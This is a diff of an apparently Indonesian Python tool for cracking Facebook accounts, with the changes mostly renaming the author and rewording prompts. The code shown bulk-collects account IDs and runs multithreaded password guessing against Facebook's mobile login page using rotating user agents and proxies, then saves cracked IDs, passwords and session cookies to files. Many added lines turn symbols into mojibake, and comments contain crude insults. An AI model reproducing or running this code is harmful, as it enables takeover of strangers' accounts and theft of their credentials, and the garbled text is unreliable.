@@ -1,4 +1,4 @@
-# code by AlaminVau
+# code by Resyah16
 # my wa business ( https://wa.me/911 )
 
 #      (C) Copyright 407 Authentic Exploit
@@ -116,7 +116,7 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 			print(f""" 
-    𝗔𝗨𝗧𝗛𝗢𝗥 𝗕𝗬: 𝗫𝗡𝗫𝗫.𝗖𝗢𝗠 (𝗣𝗿𝗲𝗺𝗶𝘂𝗺)""")
+    ð—”ð—¨ð—§ð—›ð—¢ð—¥ ð—•ð—¬: ð—«ð—¡ð—«ð—«.ð—–ð—¢ð—  (ð—£ð—¿ð—²ð—ºð—¶ð˜‚ð—º)""")
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -148,7 +148,7 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL {x} ');time.sleep(1)
+		print(f'  {x}[{h}â€¢{x}]{h} LOGIN BERHASIL {x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -171,7 +171,7 @@ def menu(my_name,my_id):
 	print(x+'\n['+h+'1'+x+'] Crack \x1b[1;92m(ON)') 
 	print(x+'['+h+'2'+x+'] Check (OF)   ')
 	print(x+'['+h+'0'+x+'] Logout ')
-	_____alvino__adijaya_____ = input(x+'\n['+h+'•'+x+'] Select : ')
+	_____alvino__adijaya_____ = input(x+'\n['+h+'â€¢'+x+'] Select : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	#elif _____alvino__adijaya_____ in ['2']:
@@ -200,10 +200,10 @@ def error():
 #-----------------[ HASIL-CRACK ]-----------------#
 def cek_hasil():
 	no,nom = 0,[]
-	one = input(f' [{hh}1{P}] cek Alamin Vau ok\n [{hh}2{P}] cek ALAMIN VAU cp\n menu : ')
+	one = input(f' [{hh}1{P}] cek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
 	if one in ['1','01']:
 		try:ok = os.listdir('OK')
-		except:sys.exit(f" [{M}>{P}] Alamin Vau ok")
+		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
 		for x in ok:
 			nom.append(x)
 			no+=1
@@ -213,7 +213,7 @@ def cek_hasil():
 		abc = input(f' [{hh}<{P}] nomor file : ')
 		file = nom[int(abc)-1]
 		try:buka = open('OK/'+file,'r').read()
-		except:sys.exit(f" [{M}>{P}] file Alamin Vau ok")
+		except:sys.exit(f" [{M}>{P}] file tidak ada hasil ok")
 		print(hh+buka+P)
 	elif one in ['2','02']:
 		try:ok = os.listdir('CP')
@@ -245,7 +245,7 @@ def dump_massal():
 		print(' Masukkan Angka Anjing, Malah Huruff ')
 		exit()
 	if jum<1 or jum>100:
-		print(' Alamin Dump Idz ')
+		print(' Gagal Dump Idz ')
 		exit()
 	ses=requests.Session()
 	yz = 0
@@ -268,7 +268,7 @@ def dump_massal():
 			print(' Sinyal Loh Kek Kontoll ')
 			exit()
 	try:
-		print(x+'['+h+'•'+x+'] Total : \x1b[1;92m'+str(len(id)))
+		print(x+'['+h+'â€¢'+x+'] Total : \x1b[1;92m'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(' Sinyal Lo kek Kontol ')
@@ -282,7 +282,7 @@ def dump_massal():
 def setting():
 	print(x+'\n['+h+'1'+x+'] Akun New \x1b[1;92m(Rekomendasi)')
 	print(x+'['+h+'2'+x+'] Akun Random  \x1b[1;92m(Rekomendasi)')
-	hu = input(x+'\n['+h+'•'+x+'] Select : ')
+	hu = input(x+'\n['+h+'â€¢'+x+'] Select : ')
 	#if hu in ['1','01']:
 		#for tua in sorted(id):
 			#id2.append(tua)
@@ -307,24 +307,24 @@ def setting():
 		exit()
 	print(x+'\n['+h+'1'+x+'] Mobile.Facebook \x1b[1;92m(Rekomendasi)')
 	#print(x+'['+h+'2'+x+'] Mbasic.Facebook \x1b[1;92m(Rekomendasi)')
-	hc = input(x+'\n['+h+'•'+x+'] Select : ')
+	hc = input(x+'\n['+h+'â€¢'+x+'] Select : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		#print(' Script make Bye Alamin Vau ')
+		#print(' Pilih Yang Bener Kontol ')
 		#setting()
 	#elif hc in ['2']:
-		#print('→FACEBOOK ID LOG IN Method Mbasic ��')
+		#print('â†’GW DAH BILANG Mbasic OF KONTOLðŸ˜’')
 		setting()
 	else:
 		method.append('mobile')
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} 𝗫𝗡𝗫𝗫.𝗖𝗢𝗠 𝗦𝗲𝗱𝗮𝗻𝗴 𝗕𝗲𝗿𝗷𝗮𝗹𝗮𝗻 {m}•{k}•{h}•{x} <<<<< ')
+	print(f'>>>>> {m}â€¢{k}â€¢{h}â€¢{x} ð—«ð—¡ð—«ð—«.ð—–ð—¢ð—  ð—¦ð—²ð—±ð—®ð—»ð—´ ð—•ð—²ð—¿ð—·ð—®ð—¹ð—®ð—» {m}â€¢{k}â€¢{h}â€¢{x} <<<<< ')
 	print('')
-	print(f'>> hasil {h}OK{x} ALAMIN di : {h}OK/%s {x}'%(okc))
-	print(f'>> hasil {k}CP{x} ALAMIN di : {k}CP/%s {x}'%(cpc))
+	print(f'>> hasil {h}OK{x} tersimpan di : {h}OK/%s {x}'%(okc))
+	print(f'>> hasil {k}CP{x} tersimpan di : {k}CP/%s {x}'%(cpc))
 	print(f'>> on/off modpes setiap {m}100{x} ID\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -368,7 +368,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{h}•{x}] 𝗫𝗡𝗫𝗫.𝗖𝗢𝗠 {h}{P}{b}{loop}{P}/{u}{len(id)}{P} {H}OK:{P}{ok}{P} {k}CP:{P}{cp}{x}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.write(f"\r[{h}â€¢{x}] ð—«ð—¡ð—«ð—«.ð—–ð—¢ð—  {h}{P}{b}{loop}{P}/{u}{len(id)}{P} {H}OK:{P}{ok}{P} {k}CP:{P}{cp}{x}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 	sys.stdout.flush()
 #	ua = random.choice(ugen)
 	#ua = random.choice(['Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/315.0.0.18.109;]','Mozilla/5.0 (Linux; Android 8.0.0; SM-A600U Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/298.0.0.10.115;]','Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/312.0.0.10.103;]','Mozilla/5.0 (Linux; Android 12; V2032 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/310.0.0.12.108;]','Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/309.0.0.16.114;]','Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/310.0.0.12.108;]','Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.114;]','Mozilla/5.0 (Linux; Android 10; HMA-L29 Build/HUAWEIHMA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.114;]'])
@@ -387,7 +387,7 @@ def crack(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r [{kk}>{P}] ID  : {kk}{idf}{P}          \n [{kk}>{P}] PW  : {kk}{pw}           {P}\n')
-				open('CP/'+cpc,'a').write(idf+'•'+pw+'\n')
+				open('CP/'+cpc,'a').write(idf+'â€¢'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -396,7 +396,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r [{hh}>{P}] ID  : {hh}{idf}{P}          \n [{hh}>{P}] PW  : {hh}{pw}          {P}\n [{hh}>{P}] CO  : {hh}{kuki}{P}          {P}\n [{hh}>{P}] UA  : {hh}{ua}{P}\n')
-				open('OK/'+okc,'a').write(idf+'•'+pw+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'â€¢'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
 				break
 				
@@ -416,4 +416,4 @@ if __name__=='__main__':
 	login()
 
 #>>>>> THANKS TO THIS HERE <<<<<#
-#>>>>> Alaminvau <<<<<#
+#>>>>> Resyah16 <<<<<#
